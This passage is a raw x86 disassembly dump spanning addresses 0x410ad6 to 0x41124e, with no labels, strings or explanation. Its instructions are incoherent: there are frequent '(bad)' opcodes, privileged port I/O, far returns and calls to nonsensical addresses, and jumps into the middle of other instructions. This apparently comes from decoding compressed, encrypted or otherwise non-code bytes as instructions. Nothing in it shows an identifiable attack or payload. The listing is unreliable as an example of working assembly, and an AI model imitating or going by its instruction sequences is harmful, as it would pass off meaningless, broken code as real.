  410ad6:	mov    bl,0xef
  410ad8:	xor    ecx,DWORD PTR [ebx-0x5d108818]
  410ade:	jp     0x410b42
  410ae0:	in     al,dx
  410ae1:	sub    BYTE PTR [ebp-0x2957a5b3],dh
  410ae7:	xchg   ebp,eax
  410ae8:	jle    0x410acc
  410aea:	adc    ah,al
  410aec:	fwait
  410aed:	xchg   edi,eax
  410aee:	retf   0x6580
  410af1:	retf   0x7c64
  410af4:	jecxz  0x410b73
  410af6:	out    0xbf,al
  410af8:	pop    eax
  410af9:	sar    DWORD PTR [esi],0x72
  410afc:	inc    ebp
  410afd:	cld    
  410afe:	or     ecx,esp
  410b00:	jno    0x410afc
  410b02:	aam    0x71
  410b04:	neg    BYTE PTR ds:[bp+si+0x47]
  410b09:	das    
  410b0a:	int    0xa7
  410b0c:	sub    eax,0xd7f1d7ce
  410b11:	jl     0x410b28
  410b13:	mov    eax,ds:0x68d57e37
  410b18:	loop   0x410abf
  410b1a:	retf   
  410b1b:	lds    ebp,FWORD PTR [esi]
  410b1d:	sbb    edi,edx
  410b1f:	mov    dl,0xcb
  410b21:	aad    0xd5
  410b23:	retf   
  410b24:	lahf   
  410b25:	loop   0x410ac6
  410b27:	icebp  
  410b28:	xor    DWORD PTR [ebx-0x49536324],0x79
  410b2f:	jmp    0x410b12
  410b31:	adc    BYTE PTR [ecx-0x47],ah
  410b34:	cmp    BYTE PTR [eax],ah
  410b36:	pop    ss
  410b37:	scas   al,BYTE PTR es:[edi]
  410b38:	add    ebx,edi
  410b3a:	push   ebx
  410b3b:	mov    WORD PTR [ebx-0x59],gs
  410b3e:	aad    0xd7
  410b40:	inc    edx
  410b41:	popf   
  410b42:	sahf   
  410b43:	adc    al,BYTE PTR [edi+0x24914ec2]
  410b49:	lds    ebp,FWORD PTR [ebx]
  410b4b:	popa   
  410b4c:	(bad)  
  410b4d:	pop    ds
  410b4e:	out    0xd4,al
  410b50:	mov    ebp,0x713cd863
  410b55:	adc    BYTE PTR [edx],dh
  410b57:	sbb    BYTE PTR [eax-0x15e0eebb],ah
  410b5d:	adc    eax,0xfe7a74e3
  410b62:	scas   eax,DWORD PTR es:[edi]
  410b63:	imul   ecx,DWORD PTR [eax-0xb6fce89]
  410b6a:	jmp    0x410b11
  410b6c:	xor    ebx,ebx
  410b6e:	pop    edi
  410b6f:	sub    ch,0x19
  410b72:	pcmpeqw mm5,QWORD PTR [ecx+0x7f7169a]
  410b79:	push   esp
  410b7a:	jne    0x410ba2
  410b7c:	jno    0x410b7a
  410b7e:	mov    ch,BYTE PTR [edx-0x7434e950]
  410b84:	fsub   QWORD PTR [eax]
  410b86:	jl     0x410bb1
  410b88:	mov    dh,0x91
  410b8a:	dec    ecx
  410b8b:	and    BYTE PTR [eax+eax*2+0x74],ah
  410b8f:	add    esi,DWORD PTR [ecx-0x61]
  410b92:	jo     0x410bf0
  410b94:	mov    ch,cl
  410b96:	xchg   ebx,eax
  410b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b98:	cmp    al,0x20
  410b9a:	sub    edi,esp
  410b9c:	sbb    eax,DWORD PTR [edx+0x66]
  410b9f:	lds    esi,FWORD PTR [eax+0x67]
  410ba2:	and    ebx,esp
  410ba4:	and    BYTE PTR [eax],ah
  410ba6:	sub    al,0x9e
  410ba9:	sbb    eax,0x2dd40edd
  410bae:	mov    edi,0x33eb3aff
  410bb3:	xor    eax,0xfe2cab9
  410bb8:	push   eax
  410bb9:	inc    esp
  410bba:	fiadd  WORD PTR [eax-0x143c9301]
  410bc0:	sbb    ah,BYTE PTR [eax]
  410bc2:	adc    edx,eax
  410bc4:	test   DWORD PTR [ecx+0x73],edi
  410bc7:	or     DWORD PTR [ebx-0x7b],ebx
  410bca:	aad    0x79
  410bcc:	clc    
  410bcd:	adc    BYTE PTR [edx-0x2b],0xae
  410bd1:	xchg   BYTE PTR [edi],dl
  410bd3:	outs   dx,DWORD PTR ds:[esi]
  410bd4:	pop    esi
  410bd5:	and    BYTE PTR [ecx+edx*8],bl
  410bd8:	lea    esi,es:[ecx-0x7f]
  410bdc:	adc    dl,BYTE PTR [eax-0x2b]
  410bdf:	push   ss
  410be0:	jg     0x410c4a
  410be2:	stos   DWORD PTR es:[edi],eax
  410be3:	ror    BYTE PTR [esp+eiz*2],cl
  410be6:	add    ch,BYTE PTR [esi-0x7a2a546b]
  410bec:	inc    ebx
  410bed:	clc    
  410bee:	nop
  410bef:	fs mov al,0x6a
  410bf2:	aad    0x53
  410bf4:	aas    
  410bf5:	pop    edx
  410bf6:	push   es
  410bf7:	in     eax,0x9e
  410bf9:	cmp    BYTE PTR ds:0xa51fcb55,al
  410bff:	popa   
  410c00:	inc    eax
  410c01:	test   DWORD PTR [ebx],ebp
  410c03:	mov    dl,BYTE PTR [esi-0x3ee62a6b]
  410c09:	(bad)  
  410c0a:	xlat   BYTE PTR ds:[ebx]
  410c0b:	lods   eax,DWORD PTR ds:[esi]
  410c0c:	cdq    
  410c0d:	lds    ebx,FWORD PTR [edx+0x8a86075]
  410c13:	xor    eax,0x4ffee0a8
  410c18:	jno    0x410c8b
  410c1a:	pop    es
  410c1b:	xor    bl,bl
  410c1d:	arpl   WORD PTR [esi-0x4e],bp
  410c20:	add    esp,DWORD PTR [eax]
  410c22:	idiv   BYTE PTR [edx]
  410c24:	xor    BYTE PTR [ecx+0x386951c3],ch
  410c2a:	adc    BYTE PTR [esi],bl
  410c2c:	lahf   
  410c2d:	pop    ds
  410c2e:	or     al,0x6
  410c30:	fscale 
  410c32:	ds pushf 
  410c34:	addr16 cmp al,0x3f
  410c37:	inc    eax
  410c38:	ret    0x2aa0
  410c3b:	mov    dl,0xce
  410c3d:	bound  esp,QWORD PTR [edi+0x41]
  410c40:	loopne 0x410c9d
  410c42:	repz cs cld 
  410c45:	xor    DWORD PTR [ebp+0x17a361ad],edx
  410c4b:	sbb    DWORD PTR [eax+0x20],ebx
  410c4e:	icebp  
  410c4f:	xor    ebp,ecx
  410c51:	and    edi,edi
  410c53:	inc    ecx
  410c54:	dec    eax
  410c55:	mov    eax,0x9c654cd5
  410c5a:	and    ch,BYTE PTR [ebx+0x13]
  410c5d:	int    0xa3
  410c5f:	mov    bl,0xfc
  410c61:	ss push esi
  410c63:	(bad)  
  410c64:	inc    BYTE PTR [ecx+0x5c]
  410c67:	(bad)  
  410c68:	call   0x248e1b79
  410c6d:	xchg   DWORD PTR [ecx+0x36],edx
  410c70:	jno    0x410c6b
  410c72:	mov    eax,ds:0x3e6dc38
  410c77:	jp     0x410ce2
  410c79:	or     al,0x61
  410c7b:	jne    0x410cf0
  410c7d:	mov    dh,0x23
  410c7f:	add    BYTE PTR [edx+0x7cff7146],0x8c
  410c86:	ds out dx,al
  410c88:	mov    bh,0xad
  410c8a:	jno    0x410c21
  410c8c:	dec    edi
  410c8d:	sub    cl,ch
  410c8f:	mov    esp,0xfd6b2dbf
  410c94:	mov    al,0x9f
  410c96:	cmc    
  410c97:	cmp    eax,0x5793c2f7
  410c9c:	jno    0x410c41
  410c9e:	stos   DWORD PTR es:[edi],eax
  410c9f:	(bad)  
  410ca0:	or     BYTE PTR [ecx+0x1fd1808c],bh
  410ca6:	shr    ebx,cl
  410ca8:	dec    ebp
  410ca9:	xchg   di,ax
  410cab:	test   al,0x5e
  410cad:	inc    esi
  410cae:	aad    0x29
  410cb0:	push   esi
  410cb1:	sbb    eax,0x61418dc7
  410cb6:	add    DWORD PTR [ebp+0x55],esi
  410cb9:	jnp    0x410ccd
  410cbb:	popf   
  410cbc:	loopne 0x410d0e
  410cbe:	jnp    0x410d1c
  410cc0:	jno    0x410ce5
  410cc2:	nop
  410cc3:	mov    al,ds:0x12c00007
  410cc8:	je     0x410ce9
  410cca:	push   edi
  410ccb:	sti    
  410ccc:	test   dh,cl
  410cce:	ja     0x410cff
  410cd0:	fsubr  QWORD PTR gs:[bp+di]
  410cd4:	mov    ds:0xb8ef71b4,eax
  410cd9:	stos   DWORD PTR es:[edi],eax
  410cda:	inc    ebp
  410cdb:	xchg   edx,esi
  410cdd:	outs   dx,BYTE PTR ds:[esi]
  410cde:	pop    ecx
  410cdf:	test   bl,al
  410ce1:	pushf  
  410ce2:	dec    ebp
  410ce3:	into   
  410ce4:	cs cdq 
  410ce6:	push   ebp
  410ce7:	or     eax,0xd3390d5f
  410cec:	loopne 0x410d21
  410cee:	out    0x4c,eax
  410cf0:	and    DWORD PTR [esi],edx
  410cf2:	(bad)  
  410cf3:	stos   DWORD PTR es:[edi],eax
  410cf4:	stos   DWORD PTR es:[edi],eax
  410cf5:	cmp    eax,0x29bff614
  410cfa:	shl    BYTE PTR [ebp+0x75ccd424],0x4c
  410d01:	(bad)  
  410d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d04:	inc    esp
  410d05:	dec    ebx
  410d06:	aad    0xff
  410d08:	sbb    eax,0x8ecbb386
  410d0d:	jbe    0x410cc8
  410d0f:	jbe    0x410cd4
  410d11:	adc    BYTE PTR [esi+ebx*4+0x74],cl
  410d15:	aaa    
  410d16:	mov    edi,0xc8f33465
  410d1b:	popa   
  410d1c:	pop    ebp
  410d1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d1e:	aad    0x22
  410d20:	dec    eax
  410d21:	sbb    dh,BYTE PTR [eax+0x461d1c10]
  410d27:	mov    al,0xda
  410d29:	fist   DWORD PTR [ebp-0x6b]
  410d2c:	fcom   DWORD PTR [ebp-0x5d120911]
  410d32:	aad    0x6b
  410d34:	fcmovnu st,st(6)
  410d36:	(bad)  
  410d38:	popf   
  410d39:	retf   0x73ad
  410d3c:	sar    DWORD PTR ds:0x6036cedf,1
  410d42:	rol    BYTE PTR [ebp-0x10f429b8],1
  410d48:	jno    0x410db2
  410d4a:	mov    eax,0x64ecfd76
  410d4f:	add    dl,dh
  410d51:	pop    ds
  410d52:	mov    BYTE PTR [ebx],0x2d
  410d55:	pop    ebp
  410d56:	inc    esi
  410d57:	js     0x410d65
  410d59:	pop    ds
  410d5a:	dec    edx
  410d5b:	inc    ebx
  410d5c:	jb     0x410ddb
  410d5e:	adc    al,0x18
  410d60:	shl    DWORD PTR [eax+0x49e1f507],1
  410d66:	lahf   
  410d67:	jne    0x410d5e
  410d69:	adc    ch,ch
  410d6b:	inc    BYTE PTR [ecx+esi*2]
  410d6e:	push   ss
  410d6f:	sub    edi,DWORD PTR [eax-0x59]
  410d72:	aas    
  410d73:	push   edx
  410d74:	pop    eax
  410d75:	sbb    al,0x26
  410d77:	sub    eax,0xb02a6c57
  410d7c:	cmp    eax,0x6bafd5ac
  410d81:	not    dh
  410d83:	dec    esp
  410d84:	scas   al,BYTE PTR es:[edi]
  410d85:	in     eax,dx
  410d86:	fiadd  WORD PTR [eax+edx*8]
  410d89:	jmp    0xb79d826a
  410d8e:	inc    ebp
  410d8f:	cmp    BYTE PTR [ecx],dh
  410d91:	and    BYTE PTR [edx-0x32bad482],ah
  410d97:	xor    DWORD PTR ds:0x6ce9d5c4,ecx
  410d9d:	aam    0xb
  410d9f:	dec    edx
  410da0:	fistp  WORD PTR [edx+0x17]
  410da3:	xchg   edx,eax
  410da4:	add    ebp,DWORD PTR [esi+ebx*4-0x30cd0e8f]
  410dab:	mov    ds:0xf2191592,al
  410db0:	xchg   ebp,eax
  410db1:	test   al,0xf7
  410db3:	adc    al,0x71
  410db5:	outs   dx,BYTE PTR ds:[esi]
  410db6:	mov    bh,0x8
  410db8:	sbb    al,BYTE PTR [ebx]
  410dba:	addr16 jne 0x410ddb
  410dbd:	mov    bl,BYTE PTR [edi-0x27ca715]
  410dc3:	push   cs
  410dc4:	jno    0x410e35
  410dc6:	loope  0x410e1d
  410dc8:	test   BYTE PTR [esp+ebp*8-0x56],ah
  410dcc:	clc    
  410dcd:	pop    ds
  410dce:	sbb    eax,0xf859d22d
  410dd3:	mov    DWORD PTR [esi],esi
  410dd5:	int    0xd5
  410dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dd8:	in     eax,dx
  410dd9:	stos   DWORD PTR es:[edi],eax
  410dda:	adc    ebx,edi
  410ddc:	in     al,dx
  410ddd:	jo     0x410d6d
  410ddf:	jne    0x410d85
  410de1:	xlat   BYTE PTR ds:[ebx]
  410de2:	sub    ch,ah
  410de4:	push   edi
  410de5:	stos   BYTE PTR es:[edi],al
  410de6:	sbb    BYTE PTR [eax-0x226cc880],ah
  410dec:	cmp    eax,esp
  410dee:	cmp    ebp,DWORD PTR [esi-0x514e0c33]
  410df4:	push   ebx
  410df5:	xlat   BYTE PTR ds:[ebx]
  410df6:	pop    eax
  410df7:	dec    ebp
  410df8:	scas   eax,DWORD PTR es:[edi]
  410df9:	js     0x410dfd
  410dfb:	and    eax,0x7f5b9972
  410e00:	jl     0x410dc0
  410e02:	test   BYTE PTR [ebx-0x7cb1156f],0x74
  410e09:	inc    ebx
  410e0a:	push   es
  410e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e0c:	cmp    BYTE PTR [edi],bh
  410e0e:	retf   0xf14e
  410e11:	dec    edx
  410e12:	jnp    0x410e85
  410e14:	mov    ebx,0x4a2d561
  410e19:	out    0xd4,al
  410e1b:	mov    ch,0x95
  410e1d:	dec    eax
  410e1e:	push   edi
  410e1f:	jne    0x410e07
  410e21:	dec    esp
  410e22:	push   ecx
  410e23:	rcr    DWORD PTR [ebx-0x15],cl
  410e26:	sbb    eax,0xdfe6767b
  410e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e2c:	adc    BYTE PTR [ebp-0x4210cd28],bh
  410e32:	xchg   esi,eax
  410e33:	std    
  410e34:	pop    es
  410e35:	ret    
  410e36:	dec    eax
  410e37:	jne    0x410e97
  410e39:	xchg   bh,ah
  410e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e3c:	lds    edx,FWORD PTR [edi+0x7]
  410e3f:	push   ebx
  410e40:	jno    0x410e87
  410e42:	jne    0x410e5f
  410e44:	xor    al,0x23
  410e46:	push   ds
  410e47:	aam    0x43
  410e49:	and    cl,dh
  410e4b:	mov    ds:0xbbc7c2d9,eax
  410e50:	retf   0xd8c6
  410e53:	jl     0x410e53
  410e55:	mov    bl,0x96
  410e57:	xlat   BYTE PTR ds:[ebx]
  410e58:	xchg   edx,eax
  410e59:	mov    bh,0x86
  410e5b:	loop   0x410ea7
  410e5d:	and    BYTE PTR [ecx-0x3a],ah
  410e60:	ja     0x410ea5
  410e62:	mov    ch,0x64
  410e64:	sbb    cl,ch
  410e66:	lds    esp,FWORD PTR [eax+0x43463e71]
  410e6c:	or     ecx,ecx
  410e6e:	nop
  410e6f:	cwde   
  410e70:	jge    0x410e9f
  410e72:	fcmovbe st,st(1)
  410e74:	ins    DWORD PTR es:[edi],dx
  410e75:	pop    es
  410e76:	xchg   esi,eax
  410e77:	cmp    DWORD PTR [edx],esp
  410e79:	out    0xa7,al
  410e7b:	imul   esi,DWORD PTR [ebx-0x2b],0xffffffd0
  410e7f:	gs clc 
  410e81:	(bad)  
  410e82:	stos   DWORD PTR es:[edi],eax
  410e83:	mov    ch,0x51
  410e85:	adc    eax,0x8b11b127
  410e8a:	push   ebp
  410e8b:	outs   dx,BYTE PTR ds:[esi]
  410e8c:	loopne 0x410e50
  410e8e:	shl    DWORD PTR [ebp+eiz*2+0x45],0xf2
  410e93:	scas   al,BYTE PTR es:[edi]
  410e94:	arpl   di,di
  410e96:	mov    cl,0xb5
  410e98:	jno    0x410e3c
  410e9a:	jmp    0x410e60
  410e9c:	cmp    al,BYTE PTR [ebp+edi*8+0x78]
  410ea0:	loope  0x410e9b
  410ea2:	mov    bh,0xd4
  410ea4:	test   eax,0x1142e3a6
  410ea9:	mov    edx,edi
  410eab:	and    eax,0x6de85954
  410eb0:	push   eax
  410eb1:	or     edx,esi
  410eb3:	shl    esp,1
  410eb5:	fmulp  st(0),st
  410eb7:	mov    ebp,0x39ec1fc7
  410ebc:	mov    ebp,0xff2467f
  410ec1:	clc    
  410ec2:	aad    0xbb
  410ec4:	retf   0xdd69
  410ec7:	std    
  410ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ec9:	les    ebp,FWORD PTR [edi+0x75]
  410ecc:	fadd   QWORD PTR [eax+0x6e]
  410ecf:	dec    eax
  410ed0:	data16 jae 0x410ebf
  410ed3:	loopne 0x410f49
  410ed5:	and    eax,0x60e0a078
  410eda:	mov    ds:0xe9169455,eax
  410edf:	jbe    0x410f41
  410ee1:	fistp  QWORD PTR [ebp-0x24]
  410ee4:	repz fist DWORD PTR ds:0xd86cd606
  410eeb:	or     dl,dh
  410eed:	mov    dh,0x4e
  410eef:	dec    edx
  410ef0:	lods   al,BYTE PTR ds:[esi]
  410ef1:	scas   eax,DWORD PTR es:[edi]
  410ef2:	repnz (bad) 
  410ef4:	dec    ebx
  410ef5:	and    BYTE PTR ds:0x494e5bde,dl
  410efb:	and    al,0x81
  410efd:	dec    ecx
  410efe:	bswap  esp
  410f00:	and    ah,BYTE PTR [eax-0x102c87a1]
  410f06:	arpl   si,cx
  410f08:	or     esp,DWORD PTR [eax]
  410f0a:	lea    ebp,[ebx+0x238944dd]
  410f10:	aam    0xbe
  410f12:	icebp  
  410f13:	push   0xca15b10c
  410f18:	inc    ebx
  410f19:	xor    al,0x45
  410f1b:	mov    ebp,DWORD PTR [edx]
  410f1d:	and    BYTE PTR [esi],ch
  410f1f:	jo     0x410ef3
  410f21:	aaa    
  410f22:	fistp  QWORD PTR [ebx+0x5cf24d56]
  410f28:	mov    al,0xfc
  410f2a:	fnstsw WORD PTR fs:[edi+0x25]
  410f2e:	retf   
  410f2f:	xchg   esp,eax
  410f30:	sti    
  410f31:	pop    ds
  410f32:	dec    ebx
  410f33:	or     al,BYTE PTR [eax+edi*1-0x12]
  410f37:	push   eax
  410f38:	shl    BYTE PTR [ebx-0x3d718a0e],cl
  410f3e:	lods   al,BYTE PTR ds:[esi]
  410f3f:	push   ebp
  410f40:	sub    DWORD PTR ds:0x86b501d7,edx
  410f46:	in     al,0x6a
  410f48:	mov    ebx,esp
  410f4a:	jno    0x410f74
  410f4c:	jno    0x410f0e
  410f4e:	inc    ebp
  410f4f:	mov    dh,0xe3
  410f51:	call   0x20238db3
  410f56:	aas    
  410f57:	dec    ecx
  410f58:	or     al,ch
  410f5a:	fadd   st,st(7)
  410f5c:	addr16 xor dl,ch
  410f5f:	xchg   ecx,eax
  410f60:	adc    ah,BYTE PTR [ecx-0x2468d24d]
  410f66:	(bad)  
  410f67:	je     0x410fa7
  410f69:	xchg   BYTE PTR [edi],dh
  410f6b:	ja     0x410f81
  410f6d:	or     DWORD PTR [ebx],esi
  410f6f:	out    dx,al
  410f70:	lock adc edx,esi
  410f73:	out    0x69,eax
  410f75:	dec    esp
  410f76:	aam    0x76
  410f78:	add    ecx,DWORD PTR [ecx-0x55]
  410f7b:	jbe    0x410f16
  410f7d:	add    al,BYTE PTR [eax+ebx*4+0x63]
  410f81:	out    0xb,eax
  410f83:	aaa    
  410f84:	push   edx
  410f85:	push   cs
  410f86:	and    bh,BYTE PTR [ebx+edi*8-0x4ae869b1]
  410f8d:	add    DWORD PTR ds:0xa93b9e0f,edx
  410f93:	jo     0x410f59
  410f95:	xor    eax,0x4a9393d5
  410f9a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f9c:	(bad)  [eax]
  410f9e:	xor    BYTE PTR [eax],dh
  410fa0:	pop    ebp
  410fa1:	jle    0x41100f
  410fa3:	and    DWORD PTR [esp+ecx*1-0x3d],esp
  410fa7:	mov    ecx,0x7c157071
  410fac:	jmp    0xbecb33cf
  410fb1:	cmp    eax,DWORD PTR [edi+0x3420e5a8]
  410fb7:	jg     0x410f9f
  410fb9:	mov    esi,0x8ab93998
  410fbe:	aad    0xf1
  410fc0:	outs   dx,BYTE PTR ds:[esi]
  410fc1:	cld    
  410fc2:	in     al,dx
  410fc3:	mov    ch,0x6
  410fc5:	jae    0x411045
  410fc7:	fwait
  410fc8:	inc    ebp
  410fc9:	dec    dl
  410fcb:	jne    0x410f5c
  410fcd:	mov    al,ds:0xe54417b
  410fd2:	(bad)  
  410fd3:	popf   
  410fd4:	ins    DWORD PTR es:[edi],dx
  410fd5:	or     BYTE PTR [esi+0x69840be4],ah
  410fdb:	jne    0x410fa6
  410fdd:	daa    
  410fde:	dec    esi
  410fdf:	sbb    al,BYTE PTR [ebp+0x71508e73]
  410fe5:	in     eax,dx
  410fe6:	adc    edi,edx
  410fe8:	sbb    al,0x9c
  410fea:	clc    
  410feb:	push   esp
  410fec:	mov    WORD PTR [edi],ds
  410fee:	aam    0x12
  410ff0:	pop    edx
  410ff1:	out    dx,eax
  410ff2:	rcl    DWORD PTR [ebx],cl
  410ff4:	jmp    0x410fbf
  410ff6:	aad    0x4
  410ff8:	and    al,0x5d
  410ffa:	sbb    eax,0x3d607ad6
  410fff:	jne    0x411000
  411001:	nop
  411002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411003:	test   DWORD PTR [eax],ecx
  411005:	ins    DWORD PTR es:[edi],dx
  411006:	pop    esp
  411007:	jb     0x411076
  411009:	pop    esi
  41100a:	aad    0x38
  41100c:	push   ds
  41100d:	nop
  41100e:	je     0x411043
  411010:	dec    ebx
  411011:	pop    ebx
  411012:	lahf   
  411013:	jne    0x410fb6
  411015:	out    0x94,eax
  411017:	cs fsubrp st(5),st
  41101a:	or     eax,ebx
  41101c:	jno    0x411051
  41101e:	fiadd  WORD PTR [eax]
  411020:	sahf   
  411021:	push   cs
  411022:	(bad)  
  411023:	enter  0x22cd,0x24
  411027:	scas   al,BYTE PTR es:[edi]
  411028:	ror    BYTE PTR [ebp-0x51d6d795],cl
  41102e:	and    BYTE PTR [ebx+0x7240c971],dl
  411034:	in     al,0xae
  411036:	sti    
  411037:	push   ebx
  411038:	push   es
  411039:	and    bl,cl
  41103b:	mov    ebp,0x47688658
  411040:	inc    esp
  411041:	cmp    edx,ebp
  411043:	repnz lahf 
  411045:	pop    esp
  411046:	sub    ebx,DWORD PTR [ebp-0x4c39b127]
  41104c:	adc    ebp,DWORD PTR [eax-0x2b]
  41104f:	repz pusha 
  411051:	pop    esp
  411052:	fild   QWORD PTR [edi-0x7c2a5eb8]
  411058:	push   esp
  411059:	or     BYTE PTR [ebx+ebx*1+0x2552eb55],ah
  411060:	ins    DWORD PTR es:[edi],dx
  411061:	and    ah,ch
  411063:	add    al,0x76
  411065:	jae    0x411022
  411067:	ins    BYTE PTR es:[edi],dx
  411068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411069:	jg     0x41104f
  41106b:	jne    0x411005
  41106d:	xchg   edx,eax
  41106e:	pushf  
  41106f:	push   ebp
  411070:	fiadd  DWORD PTR [edi]
  411072:	retf   0x1e1b
  411075:	and    BYTE PTR [ebx-0x332ba969],bl
  41107b:	and    al,0x46
  41107d:	xchg   esp,esi
  41107f:	jnp    0x411087
  411081:	retf   
  411082:	xchg   ebp,eax
  411083:	push   esi
  411084:	stc    
  411085:	or     BYTE PTR [edi+ecx*8-0x6f],bl
  411089:	sub    eax,0xe9c7a531
  41108e:	aad    0xab
  411090:	inc    ebx
  411091:	jne    0x4110bb
  411093:	stos   DWORD PTR es:[edi],eax
  411094:	jno    0x41106f
  411096:	jp     0x41101d
  411098:	or     edi,edi
  41109a:	jo     0x4110e8
  41109c:	pop    eax
  41109d:	and    BYTE PTR [edi],bl
  41109f:	test   eax,0x362fd1fe
  4110a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110a5:	add    edx,edx
  4110a7:	push   ss
  4110a8:	jmp    0x75cded0e
  4110ad:	xor    al,0xd3
  4110af:	xor    di,WORD PTR [ebp+0x79e9357d]
  4110b6:	mov    ds:0x48ef3676,al
  4110bb:	and    eax,0x61197589
  4110c0:	sbb    eax,0xc24fd525
  4110c5:	dec    ebp
  4110c6:	adc    al,0xa6
  4110c9:	mov    edi,0xec174f6
  4110ce:	call   0x7134:0xd13ef7a4
  4110d5:	or     DWORD PTR [esi],eax
  4110d7:	add    dh,BYTE PTR [edx+0x38aca659]
  4110dd:	and    BYTE PTR [esi-0x1469c98c],al
  4110e3:	rcr    dl,1
  4110e5:	xchg   ecx,eax
  4110e6:	ins    DWORD PTR es:[edi],dx
  4110e7:	shl    DWORD PTR [ecx+0x48],1
  4110ea:	xchg   edx,eax
  4110eb:	pop    edi
  4110ec:	jle    0x4110f8
  4110ee:	mov    ?,WORD PTR [edi]
  4110f0:	fmul   QWORD PTR [ebx]
  4110f2:	stos   BYTE PTR es:[edi],al
  4110f3:	jne    0x41113c
  4110f5:	dec    esi
  4110f6:	mov    ebx,DWORD PTR [ebp+0x73]
  4110f9:	(bad)  
  4110fa:	icebp  
  4110fb:	pop    ds
  4110fc:	jno    0x41115f
  4110fe:	rol    BYTE PTR [esi],1
  411100:	cmp    ah,ah
  411102:	jmp    0xe7b0:0x8203088
  411109:	push   ebp
  41110a:	psllq  mm6,mm3
  41110d:	inc    ebx
  41110e:	aad    0xc2
  411110:	retf   0x4a74
  411113:	push   DWORD PTR [esi-0x2a170425]
  411119:	nop
  41111a:	lahf   
  41111b:	jne    0x4110a2
  41111d:	push   ebx
  41111e:	in     eax,0x9c
  411120:	xlat   BYTE PTR ds:[ebx]
  411121:	jb     0x411153
  411123:	div    BYTE PTR [eax+0x22f55ed9]
  411129:	dec    ebp
  41112a:	cmc    
  41112b:	adc    eax,DWORD PTR [ebx+0x5a6f688a]
  411131:	and    BYTE PTR [ebp-0x42],dl
  411134:	adc    BYTE PTR [esi+0x21],0xc9
  411138:	ss fcmovnbe st,st(5)
  41113b:	loope  0x411106
  41113d:	test   DWORD PTR [edi+0x18],0x753a7224
  411144:	pop    es
  411145:	(bad)  
  411146:	seto   BYTE PTR [eax+0x71e1a2f8]
  41114d:	mov    ds:0x3d2789af,eax
  411152:	add    al,0x96
  411154:	inc    edi
  411155:	and    BYTE PTR [edi+0x7c],al
  411158:	add    al,0x22
  41115a:	clc    
  41115b:	call   0xbd36:0x6cdcc4a8
  411162:	cmp    ecx,DWORD PTR ds:0x1b2a4e32
  411168:	push   ebp
  411169:	arpl   WORD PTR [ebp+esi*2+0x62450edf],cx
  411170:	and    DWORD PTR [ebp-0x459e3414],esp
  411176:	aad    0x80
  411178:	stos   DWORD PTR es:[edi],eax
  411179:	(bad)  
  41117b:	pop    ebx
  41117c:	popf   
  41117d:	out    0x91,al
  41117f:	outs   dx,DWORD PTR ds:[esi]
  411180:	push   cs
  411181:	and    cl,al
  411183:	cld    
  411184:	jmp    0x53b9:0xdbba6c4e
  41118b:	aaa    
  41118c:	out    dx,eax
  41118d:	fmul   QWORD PTR [ebp-0x68]
  411190:	jno    0x411160
  411192:	(bad)  
  411193:	ss dec edx
  411195:	daa    
  411196:	mov    BYTE PTR [ebp+edx*8+0x22],al
  41119a:	or     al,0xeb
  41119c:	scas   eax,DWORD PTR es:[edi]
  41119d:	lods   al,BYTE PTR ds:[esi]
  41119e:	jne    0x41115d
  4111a0:	sbb    DWORD PTR [edx],esi
  4111a2:	sub    al,0xf1
  4111a4:	jno    0x4111a2
  4111a6:	sub    ch,BYTE PTR [ecx-0x21]
  4111a9:	in     eax,0x4
  4111ab:	fld    TBYTE PTR [ecx]
  4111ad:	inc    esp
  4111ae:	into   
  4111af:	cli    
  4111b0:	pop    edi
  4111b1:	daa    
  4111b2:	pop    ss
  4111b3:	inc    ecx
  4111b4:	sar    DWORD PTR [edi+0x41],1
  4111b7:	imul   ebp,edx,0xffffffd0
  4111ba:	adc    DWORD PTR [ecx+0x17fe2000],esi
  4111c0:	pop    esi
  4111c1:	pop    ebx
  4111c2:	enter  0xef98,0x1f
  4111c6:	icebp  
  4111c7:	mov    ah,0x2f
  4111c9:	ins    BYTE PTR es:[edi],dx
  4111ca:	sbb    DWORD PTR [ebx+0x28ee0211],esp
  4111d0:	mov    ebx,0xc03edc1e
  4111d5:	pop    ds
  4111d6:	dec    ebp
  4111d7:	repnz clc 
  4111d9:	pop    ss
  4111da:	les    eax,FWORD PTR [ebp+0x43d6a496]
  4111e0:	add    bl,BYTE PTR [edi+edi*2-0x65]
  4111e4:	shl    DWORD PTR ds:0x20463abd,cl
  4111ea:	inc    esp
  4111eb:	pop    edx
  4111ec:	and    BYTE PTR [edi+eax*4],ah
  4111ef:	mov    edx,0x69d5eaa3
  4111f4:	mov    al,0x8c
  4111f6:	daa    
  4111f7:	and    BYTE PTR [edx],dl
  4111f9:	jae    0x4111a5
  4111fb:	jne    0x411270
  4111fd:	jmp    0x411245
  4111ff:	mov    esi,0x4e47aeb3
  411204:	jno    0x41127a
  411206:	push   esp
  411207:	push   edx
  411208:	push   esi
  411209:	retf   0x9ffc
  41120c:	out    0x22,eax
  41120e:	fyl2xp1 
  411210:	ror    ah,cl
  411212:	ja     0x4111ca
  411214:	adc    BYTE PTR [eax+0x1d],ah
  411217:	fidivr WORD PTR [ecx+eiz*1-0x49]
  41121b:	sub    dl,BYTE PTR [eax+0x7162fed3]
  411221:	call   0x51cf9e68
  411226:	js     0x41129d
  411228:	mov    bl,0x9b
  41122a:	test   DWORD PTR [esi+0xc],ebx
  41122d:	mov    ds:0x8f718097,eax
  411232:	out    0x11,al
  411234:	xrelease xchg BYTE PTR [ebx-0x7fdd82b7],dh
  41123b:	aam    0x93
  41123d:	in     eax,0x68
  41123f:	jecxz  0x411232
  411241:	dec    eax
  411242:	mov    ecx,0xdeaf5394
  411247:	test   BYTE PTR [edx],0x61
  41124a:	and    eax,DWORD PTR [ebp-0x6a]
  41124d:	pop    ds
  41124e:	std    
